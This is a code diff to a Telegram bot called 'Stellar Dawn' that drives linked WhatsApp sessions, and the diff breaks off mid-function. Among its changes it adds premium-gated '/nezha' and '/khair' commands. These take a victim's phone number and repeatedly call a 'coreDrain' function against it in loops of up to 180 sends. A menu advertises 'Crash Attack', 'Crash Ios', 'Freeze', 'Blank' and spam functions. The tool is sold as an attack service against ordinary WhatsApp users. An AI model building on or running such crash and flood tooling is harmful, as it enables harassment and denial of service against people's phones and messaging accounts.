@@ -78,7 +78,7 @@ const SESSIONS_DIR = "./sessions";
 const SESSIONS_FILE = "./sessions/active_sessions.json";
 const axios = require("axios");
 const cheerio = require('cheerio');
-const path = require('path');
+// const path = require('path'); // Duplicate, already declared above
 const util = require('util');
 const writeFile = util.promisify(fs.writeFile);
 const unlink = util.promisify(fs.unlink);
@@ -115,13 +115,13 @@ function saveVerifiedUser(userId) {
 
 loadVerifiedUsers();
 
-////get video
-const videoList = [
-    "https://files.catbox.moe/c933y5.mp4", 
+////get image
+const imageList = [
+    "https://files.catbox.moe/7bb7po.png", 
 ];
 
-const getRandomVideo = () => {
-    return videoList[Math.floor(Math.random() * videoList.length)];
+const getRandomImage = () => {
+    return imageList[Math.floor(Math.random() * imageList.length)];
 };
 
 /// --- ( Variabel yang perlu didefinisikan ) --- \\\
@@ -252,7 +252,7 @@ async function validateToken() {
 ⠀⠀⠀⠀      ⠀     ⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀           ⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀           ⠀⠀⣼⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀            ⠀⠀⠻⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀            ⠀⠀⠻⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
         `));
         console.log(chalk.red(`ADD TOKEN DULU NGABB`));
         process.exit(1);
@@ -283,8 +283,8 @@ function startBot() {
 ┌──────────────────────────┐
 │  INFORMATION SCRIPT
 ├──────────────────────────┤
-│ NAME SCRIPT: Kairn Base
-│ VERSION : 1.0.0
+│ NAME SCRIPT: Stellar Dawn
+│ VERSION : 2.9.0
 │ STATUS : BOT RUNNING
 └──────────────────────────┘
     `));
@@ -301,7 +301,10 @@ main();
 
 // --------------- ( Save Session & Installasion WhatsApp ) ------------------- \\
 let sock;
-
+function getActiveSock() {
+    if (sessions.size === 0) return null;
+    return sessions.values().next().value;
+}
 function saveActiveSessions(botNumber) {
   try {
     const sessionsList = [];
@@ -381,11 +384,12 @@ async function connectToWhatsApp(botNumber, chatId) {
     .sendMessage(
       chatId,
       `
-<blockquote>┌─────────────────────────┐
+ <pre>( ⚠️ ) ＳＴＥＬＬＡＲ - ＤＡＷＮ</pre>
+┌─────────────────────────┐
 │  MENYIAPKAN CODE PAIRING
 ├─────────────────────────┤
 │ Nomor : ${botNumber}
-└─────────────────────────┘</blockquote>
+└─────────────────────────┘
 `,
       { parse_mode: "HTML" }
     )
@@ -409,12 +413,13 @@ async function connectToWhatsApp(botNumber, chatId) {
       if (statusCode && statusCode >= 500 && statusCode < 600) {
         await bot.editMessageText(
           `
-<blockquote>┌─────────────────────────┐
+<pre>( ⚠️ ) ＳＴＥＬＬＡＲ - ＤＡＷＮ</pre>
+┌─────────────────────────┐
 │ Memproses Connection
 ├─────────────────────────┤
 │ Nomor : ${botNumber}
 │ Status : Proses 🔄.
-└─────────────────────────┘</blockquote>
+└─────────────────────────┘
 `,
           {
             chat_id: chatId,
@@ -426,12 +431,13 @@ async function connectToWhatsApp(botNumber, chatId) {
       } else {
         await bot.editMessageText(
           `
-<blockquote>┌─────────────────────────┐
+<pre>( ⚠️ ) ＳＴＥＬＬＡＲ - ＤＡＷＮ</pre>
+┌─────────────────────────┐
 │ Connection Gagal
 ├─────────────────────────┤
 │ Nomor : ${botNumber}
 │ Status :  Gagal ❌
-└─────────────────────────┘</blockquote>
+└─────────────────────────┘
 `,
           {
             chat_id: chatId,
@@ -451,12 +457,13 @@ async function connectToWhatsApp(botNumber, chatId) {
       saveActiveSessions(botNumber);
       await bot.editMessageText(
         `
-<blockquote>┌─────────────────────────┐
+ <pre>( ⚠️ ) ＳＴＥＬＬＡＲ - ＤＡＷＮ</pre>       
+┌─────────────────────────┐
 │ Connection Sukses
 ├─────────────────────────┤
 │ Nomor : ${botNumber}
 │ Status : Sukses Connect.✅
-└─────────────────────────┘</blockquote>
+└─────────────────────────┘
 `,
         {
           chat_id: chatId,
@@ -473,12 +480,13 @@ async function connectToWhatsApp(botNumber, chatId) {
 
           await bot.editMessageText(
             `
-<blockquote>┌─────────────────────────┐
+<pre>( ⚠️ ) ＳＴＥＬＬＡＲ - ＤＡＷＮ</pre>
+┌─────────────────────────┐
 │ YOUR CODE PAIRING
 ├─────────────────────────┤
 │ Nomor : ${botNumber}
-│ Kode  : <code>${formattedCode}</code>
-└─────────────────────────┘</blockquote>
+│ Kode  : ${formattedCode}
+└─────────────────────────┘
 `,
             {
               chat_id: chatId,
@@ -490,12 +498,13 @@ async function connectToWhatsApp(botNumber, chatId) {
         console.error("Error requesting pairing code:", error);
         await bot.editMessageText(
           `
-<blockquote>┌─────────────────────────┐
+<pre>( ⚠️ ) ＳＴＥＬＬＡＲ - ＤＡＷＮ</pre>
+┌─────────────────────────┐
 │ STATUS │ Sedang Pairing
 ├─────────────────────────┤
 │ Nomor : ${botNumber}
 │ Kode  : ${error.message} Error⚠️
-└─────────────────────────┘</blockquote>
+└─────────────────────────
 `,
           {
             chat_id: chatId,
@@ -563,6 +572,51 @@ loadCeoUsers();
 function isOwner(userId) {
     return config.OWNER_ID.includes(userId.toString());
 }
+///Function add group
+// --- ( case add group premium ) ---
+// File untuk menyimpan data grup premium
+const GROUP_PREMIUM_FILE = './kairn/grouppremium.json';
+let premiumGroups = [];
+
+// Fungsi untuk memastikan file exist
+function ensureGroupFileExists() {
+    if (!fs.existsSync('./kairn')) {
+        fs.mkdirSync('./kairn', { recursive: true });
+    }
+    if (!fs.existsSync(GROUP_PREMIUM_FILE)) {
+        fs.writeFileSync(GROUP_PREMIUM_FILE, JSON.stringify([], null, 2));
+    }
+}
+
+// Load data grup premium
+function loadPremiumGroups() {
+    try {
+        ensureGroupFileExists();
+        premiumGroups = JSON.parse(fs.readFileSync(GROUP_PREMIUM_FILE));
+        console.log(chalk.green(`✅ Loaded ${premiumGroups.length} premium groups`));
+    } catch (error) {
+        premiumGroups = [];
+        console.error("Error loading premium groups:", error);
+    }
+}
+
+// Save data grup premium
+function savePremiumGroups() {
+    try {
+        ensureGroupFileExists();
+        fs.writeFileSync(GROUP_PREMIUM_FILE, JSON.stringify(premiumGroups, null, 2));
+    } catch (error) {
+        console.error("Error saving premium groups:", error);
+    }
+}
+
+// Load data saat startup
+loadPremiumGroups();
+
+// --- ( Fungsi cek apakah grup premium ) ---
+function isGroupPremium(groupId) {
+    return premiumGroups.includes(groupId);
+}
 
 // ------------ ( Function Plugins ) ------------- \\
 function formatRuntime(seconds) {
@@ -607,15 +661,15 @@ bot.onText(/\/start/, async (msg) => {
 
     // Cek apakah user sudah terverifikasi
     if (!verifiedUsers.has(userId)) {
-        const randomVideo = getRandomVideo();
+        const randomImage = getRandomImage();
 
-        return bot.sendVideo(chatId, randomVideo, {
-            supports_streaming: true,
+        return bot.sendPhoto(chatId, randomImage, {
             caption: `
- <pre>ＫＡＩＲＮ - ＳＥＣＵＲＩＴＹ</pre>
-<blockquote>Kairn Base — самая рекомендуемая база для ботов. С элегантным дизайном от SonKairn. Kairn Base также имеет новейшие и качественные функции. </blockquote>
+<pre>( ⚠️ ) ＳＴＥＬＬＡＲ - ＤＡＷＮ</pre>
+Stellar Dawn — самая рекомендуемая база для ботов. С элегантным дизайном от SonKairn. 
+Stellar Dawn также имеет новейшие и качественные функции. 
 ─────────────────────────
-Tolong masukan kode otp yang benar untuk melanjutkan ke menu bot
+Masukan Otp Untuk Melanjutkan
 `,
             parse_mode: "HTML",
         });
@@ -663,21 +717,21 @@ async function showStartMenu(chatId, msg) {
     );
     const premiumStatus = isUserPremium ? "✅ Premium" : "❌ Regular";
         
-    const randomVideo = getRandomVideo();
+    const randomImage = getRandomImage();
 
-    await bot.sendVideo(chatId, randomVideo, {
-        supports_streaming: true,
+    await bot.sendPhoto(chatId, randomImage, {
         caption: `
-<pre>ＫＡＩＲＮ - ＢＡＳＥ</pre>
-<blockquote>Kairn Base — самая рекомендуемая база для ботов. С элегантным дизайном от SonKairn. Kairn Base также имеет новейшие и качественные функции. </blockquote>
+<pre>( ⚠️ ) ＳＴＥＬＬＡＲ - ＤＡＷＮ</pre>
+Stellar Dawn — самая рекомендуемая база для ботов. С элегантным дизайном от SonKairn. 
+Stellar Dawn также имеет новейшие и качественные функции. 
 ─────────────────────────
-<blockquote># ☇ 𝘐𝘕𝘍𝘖𝘙𝘔𝘈𝘛𝘐𝘖𝘕 𝘚𝘊𝘙𝘐𝘗𝘛</blockquote>
-╰┈ • 𝖭𝖺𝗆𝖾 : 𝖪𝖺𝗂𝗋𝗇-𝖡𝖺𝗌𝖾
+<pre># ☇ 𝘐𝘕𝘍𝘖𝘙𝘔𝘈𝘛𝘐𝘖𝘕 𝘚𝘊𝘙𝘐𝘗𝘛</pre>
+╰┈ • 𝖭𝖺𝗆𝖾 : Stellar Dawn 
+╰┈ • Version : 2.9.0 Kairn-Style
 ╰┈ • 𝖠𝗎𝗍𝗁𝗈𝗋: 𝖲𝗈𝗇𝖪𝖺𝗂𝗋𝗇
 ╰┈ • 𝖲𝗒𝗌𝗍𝖾𝗆: 𝖠𝗎𝗍𝗈 𝖴𝗉𝖽𝖺𝗍𝖾
 ╰┈ • 𝖯𝗋𝖾𝖿𝗂𝗑: 𝘚𝘭𝘢𝘴𝘩 ( / ) 
 ╰┈ • 𝖫𝖺𝗇𝗀𝗎𝖺𝗀𝖾: 𝖩𝖺𝗏𝖺𝗌𝖼𝗋𝗂𝗉𝗍
-
 `,
         parse_mode: "HTML",
         reply_markup: {
@@ -693,7 +747,7 @@ bot.on("callback_query", async (callbackQuery) => {
         const chatId = callbackQuery.message.chat.id;
         const messageId = callbackQuery.message.message_id;
         const data = callbackQuery.data;
-        const randomVideo = getRandomVideo();
+        const randomImage = getRandomImage();
         const senderId = callbackQuery.from.id;
         
         const isUserPremium = premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date());
@@ -707,25 +761,54 @@ bot.on("callback_query", async (callbackQuery) => {
 
         if (data === "bugshow") {
             newCaption = `
-<pre>ＫＡＩＲＮ - ＢＡＳＥ</pre>
-<blockquote>Kairn Base — самая рекомендуемая база для ботов. С элегантным дизайном от SonKairn. Kairn Base также имеет новейшие и качественные функции. </blockquote>
-─────────────────────────
-<blockquote># ☇ 𝘌𝘟𝘗𝘓𝘖𝘐𝘛 - 𝘔𝘌𝘕𝘜</blockquote>
-/nezha - Polling System 
+<pre>( ⚠️ ) ＳＴＥＬＬＡＲ - ＤＡＷＮ</pre>
+Stellar Dawn — самая рекомендуемая база для ботов. С элегантным дизайном от SonKairn. 
+Stellar Dawn также имеет новейшие и качественные функции. 
+────────────────────────
+# ☇ 𝘌𝘟𝘗𝘓𝘖𝘐𝘛 - 𝘔𝘌𝘕𝘜
+/nezha - Crash Attack
+/khair - Delay Strike
             `;
             newButtons = [
-                [{ text: "тление", callback_data: "bug2", style: "danger"}], 
-                [{ text: "НАЗАД", callback_data: "mainmenu" }], 
+            
+                [
+                    
+                { text: "НАЗАД", callback_data: "mainmenu" },
+                                 { text: "НАЗАД", callback_data: "v2", style: "danger" }
+                ], 
+            ];
+        } else if (data === "v2") {
+            newCaption = `
+<pre> ＳＴＥＬＬＡＲ - ＤＡＷＮ</pre>
+Stellar Dawn — самая рекомендуемая база для ботов. С элегантным дизайном от SonKairn. 
+Stellar Dawn также имеет новейшие и качественные функции. 
+─────────────────────────
+<pre># ☇ 𝘌𝘟𝘗𝘓𝘖𝘐𝘛 - 𝘔𝘌𝘕𝘜</pre>
+/zincy - Bulldozer
+/athena - Crash Ios 
+/thea - Freeze Stuck Logo Click
+/ghory - Blank 1 Msg
+<pre> 𝖠𝗅𝗅 𝖢𝗈𝗆𝗆𝖺𝗇𝖽 𝗏𝟤 𝖡𝖾𝖻𝖺𝗌 𝖲𝗉𝖺𝗆 </pre>
+            `;
+            newButtons = [
+[
+                                { text: "⬅️", callback_data: "bugshow", style: "danger"}, 
+                { text: "НАЗАД", callback_data: "mainmenu" }
+                ], 
             ];
         } else if (data === "ownermenu") {
             newCaption = `
-<pre>ＫＡＩＲＮ - ＢＡＳＥ</pre>
-<blockquote>Kairn Base — самая рекомендуемая база для ботов. С элегантным дизайном от SonKairn. Kairn Base также имеет новейшие и качественные функции. </blockquote>
+<pre> ＳＴＥＬＬＡＲ - ＤＡＷＮ</pre>
+Stellar Dawn — самая рекомендуемая база для ботов. С элегантным дизайном от SonKairn. 
+Stellar Dawn также имеет новейшие и качественные функции. 
 ─────────────────────────
-<blockquote># ☇ 𝘊𝘖𝘕𝘛𝘙𝘖𝘓 - 𝘔𝘌𝘕𝘜</blockquote>
+<pre># ☇ 𝘊𝘖𝘕𝘛𝘙𝘖𝘓 - 𝘔𝘌𝘕𝘜</pre>
  ◌️ /reloadcore - Update Bot
  ◌ /addprem - Add premium user
  ◌ /delprem - delete premium users
+ ◌ /aboutme - Info User
+ ◌ /uploadfunc - untuk testfunction
+ ◌ /testfunction - test function
  ◌ /addceo - add ceo user
  ◌ /delceo - delete ceo users
  ◌ /listprem - list user premium
@@ -735,50 +818,29 @@ bot.on("callback_query", async (callbackQuery) => {
             newButtons = [
                                 [{ text: "НАЗАД", callback_data: "mainmenu" }], 
             ];
-            } else if (data === "bug2") {
-            newCaption = `
-<pre>ＫＡＩＲＮ - ＢＡＳＥ</pre>
-<blockquote>Kairn Base — самая рекомендуемая база для ботов. С элегантным дизайном от SonKairn. Kairn Base также имеет новейшие и качественные функции. </blockquote>
-─────────────────────────
-<blockquote># ☇ Exploit - Version2 </blockquote>
-/latera    - Blank Ui Invisible
-/thores   - Delay Flood
-            `;
-            newButtons = [
-                                [{ text: "НАЗАД", callback_data: "mainmenu" }], 
-            ];
         } else if (data === "thanksto") {
             newCaption = `
-<pre>ＫＡＩＲＮ - ＢＡＳＥ</pre>
-<blockquote>Kairn Base — самая рекомендуемая база для ботов. С элегантным дизайном от SonKairn. Kairn Base также имеет новейшие и качественные функции. </blockquote>
+<pre>( ⚠️ ) ＳＴＥＬＬＡＲ - ＤＡＷＮ</pre>
+Stellar Dawn — самая рекомендуемая база для ботов. С элегантным дизайном от SonKairn. 
+Stellar Dawn также имеет новейшие и качественные функции. 
 ─────────────────────────
-<blockquote># ☇ 𝘛𝘏𝘈𝘕𝘒𝘚 - 𝘛𝘖</blockquote>
+<pre># ☇ 𝘛𝘏𝘈𝘕𝘒𝘚 - 𝘛𝘖</pre>
 - 𝖲𝗈𝗇𝖪𝖺𝗂𝗋𝗇 - Author
+- Allah - My God
+
             `;
             newButtons = [
                         [{ text: "НАЗАД", callback_data: "mainmenu" }], 
             ];
-            } else if (data === "tools") {
-            newCaption = `
-<pre>ＫＡＩＲＮ - ＢＡＳＥ</pre>
-<blockquote>Kairn Base — самая рекомендуемая база для ботов. С элегантным дизайном от SonKairn. Kairn Base также имеет новейшие и качественные функции. </blockquote>
-─────────────────────────
-<blockquote># ☇ 𝘛𝘖𝘖𝘓𝘚 - 𝘔𝘌𝘕𝘜</blockquote>
-- /ai            - asisten ai 
-- /jadwalsholat  - Jadwal Sholat Tiap kota
-- /brat          - buat gambar (brat) 
-
-            `;
-            newButtons = [
-                             [{ text: "НАЗАД", callback_data: "mainmenu" }],  
-            ];
         } else if (data === "mainmenu") {
             newCaption = `
-<pre>ＫＡＩＲＮ - ＢＡＳＥ</pre>
-<blockquote>Kairn Base — самая рекомендуемая база для ботов. С элегантным дизайном от SonKairn. Kairn Base также имеет новейшие и качественные функции. </blockquote>
+<pre>( ⚠️ ) ＳＴＥＬＬＡＲ - ＤＡＷＮ</pre>
+Stellar Dawn — самая рекомендуемая база для ботов. С элегантным дизайном от SonKairn. 
+Stellar Dawn также имеет новейшие и качественные функции. 
 ─────────────────────────
-<blockquote># ☇ 𝘐𝘕𝘍𝘖𝘙𝘔𝘈𝘛𝘐𝘖𝘕 𝘚𝘊𝘙𝘐𝘗𝘛</blockquote>
-╰┈ • 𝖭𝖺𝗆𝖾 : 𝖪𝖺𝗂𝗋𝗇-𝖡𝖺𝗌𝖾
+<pre># ☇ 𝘐𝘕𝘍𝘖𝘙𝘔𝘈𝘛𝘐𝘖𝘕 𝘚𝘊𝘙𝘐𝘗𝘛</pre>
+╰┈ • 𝖭𝖺𝗆𝖾 : Stellar Dawn 
+╰┈ • Version : 2.9.0 Kairn-Style
 ╰┈ • 𝖠𝗎𝗍𝗁𝗈𝗋: 𝖲𝗈𝗇𝖪𝖺𝗂𝗋𝗇
 ╰┈ • 𝖲𝗒𝗌𝗍𝖾𝗆: 𝖠𝗎𝗍𝗈 𝖴𝗉𝖽𝖺𝗍𝖾
 ╰┈ • 𝖯𝗋𝖾𝖿𝗂𝗑: 𝘚𝘭𝘢𝘴𝘩 ( / ) 
@@ -786,15 +848,11 @@ bot.on("callback_query", async (callbackQuery) => {
             `;
             newButtons = [
                 [
-                    { text: "тление", callback_data: "bugshow", style: "danger"}
-
+                    { text: "тление", callback_data: "bugshow", style: "danger"}, 
+{ text: "саппорт", callback_data: "thanksto", style: "danger" }, 
                 ], 
                 [
-                    { text: "саппорт", callback_data: "thanksto" }, 
                     { text: "руль", callback_data: "ownermenu" }
-                ], 
-                [
-                { text: "ИНСТРУМЕНТЫ", callback_data: "tools", style: "danger" }
                 ], 
             ];
         } else {
@@ -802,8 +860,8 @@ bot.on("callback_query", async (callbackQuery) => {
         }
 
         await bot.editMessageMedia({
-            type: "video",
-            media: randomVideo,
+            type: "photo",
+            media: randomImage,
             caption: newCaption,
             parse_mode: "HTML"
         }, {
@@ -828,9 +886,7 @@ const activePolls = new Map();
 bot.onText(/\/nezha(?:\s+(\d+))?/, async (msg, match) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
-    const messageId = msg.message_id;
 
-    // Validasi format
     if (!match || !match[1]) {
         return bot.sendMessage(chatId, 
             `❌ *Format salah!*\n\nGunakan: /nezha [nomor]\nContoh: /nezha 628888888888`,
@@ -839,17 +895,496 @@ bot.onText(/\/nezha(?:\s+(\d+))?/, async (msg, match) => {
     }
 
     const targetNumber = match[1];
-    const randomVideo = getRandomVideo();
+    const randomImage = getRandomImage();
     const date = getCurrentDate();
     const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
+    const target = `${formattedNumber}@s.whatsapp.net`;
+    const isUserPremium = premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date());
 
-    // Validasi panjang nomor
-    if (formattedNumber.length < 10 || formattedNumber.length > 15) {
+    if (!isUserPremium) {
+        return bot.sendPhoto(chatId, randomImage, {
+            caption: `<blockquote>(本) 𝖲𝗍𝖾𝗅𝗅𝖺𝗋 - Dawn</blockquote>\n❌ Akses ditolak. Fitur ini hanya untuk user premium.`,
+            parse_mode: "HTML",
+            reply_markup: {
+                inline_keyboard: [[{ text: "𝖠𝗎𝗍𝗁𝗈𝗋", url: "https://t.me/SonKairn" }]]
+            }
+        });
+    }
+
+    if (sessions.size === 0) {
+        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu.`);
+    }
+
+    const imageMsg = await bot.sendPhoto(chatId, randomImage, {
+        caption: `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${formattedNumber}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ⏳ 𝖬𝖾𝗇𝗎𝗇𝗀𝗀𝗎 𝖯𝗂𝗅𝗂𝗁𝖺𝗇
+│─ Date   : ${date}
+└────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+        `,
+        parse_mode: "HTML"
+    });
+
+    const pollMessage = await bot.sendPoll(chatId, 
+        `ПОЖАЛУЙСТА, ВЫБЕРИТЕ`,
+        ['30%', '50%', '70%'],
+        {
+            is_anonymous: false,
+            allows_multiple_answers: false,
+            reply_to_message_id: imageMsg.message_id,
+            open_period: 60
+        }
+    );
+
+    activePolls.set(pollMessage.poll.id, {
+        chatId,
+        userId,
+        targetNumber: formattedNumber,
+        target,
+        videoMessageId: imageMsg.message_id,
+        pollMessageId: pollMessage.message_id,
+        pollId: pollMessage.poll.id,
+        date,
+        randomImage
+    });
+
+    setTimeout(async () => {
+        try {
+            if (!activePolls.has(pollMessage.poll.id)) return;
+            await bot.deleteMessage(chatId, pollMessage.message_id);
+            await bot.editMessageCaption(
+                `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${formattedNumber}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ⌛ 𝖤𝗑𝗉𝗂𝗋𝖾𝖽
+│─ Date   : ${date}
+└────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+                `,
+                {
+                    chat_id: chatId,
+                    message_id: imageMsg.message_id,
+                    parse_mode: "HTML"
+                }
+            );
+            activePolls.delete(pollMessage.poll.id);
+        } catch (err) {
+            console.log('Error cleanup poll:', err);
+        }
+    }, 60000);
+});
+
+bot.on('poll_answer', async (pollAnswer) => {
+    const pollId = pollAnswer.poll_id;
+    const userId = pollAnswer.user.id;
+    const selectedOptions = pollAnswer.option_ids;
+
+    const pollData = activePolls.get(pollId);
+    if (!pollData) return;
+
+    if (userId !== pollData.userId) {
+        return bot.sendMessage(pollData.chatId, 
+            `⚠️ @${pollAnswer.user.username} — 𝖧𝖺𝗇𝗒𝖺 𝗎𝗇𝗍𝗎𝗄 𝗎𝗌𝖾𝗋 𝗒𝖺𝗇𝗀 𝗋𝖾𝗊𝗎𝖾𝗌𝗍!`
+        );
+    }
+
+    const optionId = selectedOptions[0];
+    let action;
+    switch(optionId) {
+        case 0: action = '30%'; break;
+        case 1: action = '50%'; break;
+        case 2: action = '70%'; break;
+        default: return;
+    }
+
+    try { await bot.deleteMessage(pollData.chatId, pollData.pollMessageId); } 
+    catch (err) { console.log('Error deleting poll:', err); }
+
+    if (action === 'cancel') {
+        await bot.editMessageCaption(
+            `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${pollData.targetNumber}
+│─ Rasio  : ${action.toUpperCase()}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ❌ 𝖡𝖺𝗍𝖺𝗅
+│─ Date   : ${pollData.date}
+└────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+            `,
+            {
+                chat_id: pollData.chatId,
+                message_id: pollData.videoMessageId,
+                parse_mode: "HTML",
+                reply_markup: {
+                    inline_keyboard: [[{ text: "Проверь", url: `https://wa.me/${pollData.targetNumber}` }]]
+                }
+            }
+        );
+        activePolls.delete(pollId);
+        return;
+    }
+
+    await bot.editMessageCaption(
+        `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${pollData.targetNumber}
+│─ Rasio   : ${action.toUpperCase()}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
+│─ Date   : ${pollData.date}
+└────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+        `,
+        {
+            chat_id: pollData.chatId,
+            message_id: pollData.videoMessageId,
+            parse_mode: "HTML",
+            reply_markup: {
+                inline_keyboard: [[{ text: "Проверь", url: `https://wa.me/${pollData.targetNumber}` }]]
+            }
+        }
+    );
+
+    try {
+        const sock = sessions.values().next().value;
+        const target = `${pollData.targetNumber}@s.whatsapp.net`;
+
+        if (action === '30%') {
+            for (let i = 0; i < 20; i++) {
+                await coreDrain(sock, target);
+                await sleep(200);
+                await coreDrain(sock, target);
+                await sleep(200);
+            }
+        } else if (action === '50%') {
+            for (let i = 0; i < 40; i++) {
+                await coreDrain(sock, target);
+                await sleep(200);
+                await coreDrain(sock, target);
+                await sleep(200);
+                await coreDrain(sock, target);
+                await sleep(200);
+            }
+        }
+        else if (action === '70%') {
+            for (let i = 0; i < 60; i++) {
+                await coreDrain(sock, target);
+                await sleep(200);
+                await coreDrain(sock, target);
+                await sleep(200);
+                await coreDrain(sock, target);
+                await sleep(200);
+                }
+                }
+
+        await bot.editMessageCaption(
+            `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${pollData.targetNumber}
+│─ Rasio  : ${action.toUpperCase()}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ✅ 𝖲𝗎𝖼𝖼𝖾𝗌𝗌
+│─ Date   : ${pollData.date}
+└────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+            `,
+            {
+                chat_id: pollData.chatId,
+                message_id: pollData.videoMessageId,
+                parse_mode: "HTML",
+                reply_markup: {
+                    inline_keyboard: [[{ text: "Проверь", url: `https://wa.me/${pollData.targetNumber}` }]]
+                }
+            }
+        );
+
+    } catch (err) {
+        await bot.editMessageCaption(
+            `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${pollData.targetNumber}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ❌ 𝖦𝖺𝗀𝖺𝗅
+│─ Error  : ${err.message}
+│─ Date   : ${pollData.date}
+└────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+            `,
+            {
+                chat_id: pollData.chatId,
+                message_id: pollData.videoMessageId,
+                parse_mode: "HTML"
+            }
+        );
+    }
+
+    activePolls.delete(pollId);
+});
+bot.onText(/\/khair(?:\s+(\d+))?/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+
+    if (!match || !match[1]) {
         return bot.sendMessage(chatId, 
-            `❌ Nomor tidak valid. Pastikan nomor 10-15 digit (termasuk kode negara).\nContoh: /nezha 628888888888`,
+            `❌ *Format salah!*\n\nGunakan: /nezha [nomor]\nContoh: /nezha 628888888888`,
             { parse_mode: "Markdown" }
         );
     }
+
+    const targetNumber = match[1];
+    const randomImage = getRandomImage();
+    const date = getCurrentDate();
+    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
+
+    const target = `${formattedNumber}@s.whatsapp.net`;
+    const isUserPremium = premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date());
+
+    if (!isUserPremium) {
+        return bot.sendPhoto(chatId, randomImage, {
+            caption: `<blockquote>(本) 𝖲𝗍𝖾𝗅𝗅𝖺𝗋 - Dawn</blockquote>\n❌ Akses ditolak. Fitur ini hanya untuk user premium.`,
+            parse_mode: "HTML",
+            reply_markup: {
+                inline_keyboard: [[{ text: "𝖠𝗎𝗍𝗁𝗈𝗋", url: "https://t.me/SonKairn" }]]
+            }
+        });
+    }
+
+    if (sessions.size === 0) {
+        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu.`);
+    }
+
+    const imageMsg = await bot.sendPhoto(chatId, randomImage, {
+        caption: `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${formattedNumber}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ⏳ 𝖬𝖾𝗇𝗎𝗇𝗀𝗀𝗎 𝖯𝗂𝗅𝗂𝗁𝖺𝗇
+│─ Date   : ${date}
+└────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+        `,
+        parse_mode: "HTML"
+    });
+
+    const pollMessage = await bot.sendPoll(chatId, 
+        `ПОЖАЛУЙСТА, ВЫБЕРИТЕ`,
+        ['30%', '50%', '70%'],
+        {
+            is_anonymous: false,
+            allows_multiple_answers: false,
+            reply_to_message_id: imageMsg.message_id,
+            open_period: 60
+        }
+    );
+
+    activePolls.set(pollMessage.poll.id, {
+        chatId,
+        userId,
+        targetNumber: formattedNumber,
+        target,
+        videoMessageId: imageMsg.message_id,
+        pollMessageId: pollMessage.message_id,
+        pollId: pollMessage.poll.id,
+        date,
+        randomImage
+    });
+
+    setTimeout(async () => {
+        try {
+            if (!activePolls.has(pollMessage.poll.id)) return;
+            await bot.deleteMessage(chatId, pollMessage.message_id);
+            await bot.editMessageCaption(
+                `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${formattedNumber}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ⌛ 𝖤𝗑𝗉𝗂𝗋𝖾𝖽
+│─ Date   : ${date}
+└────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+                `,
+                {
+                    chat_id: chatId,
+                    message_id: imageMsg.message_id,
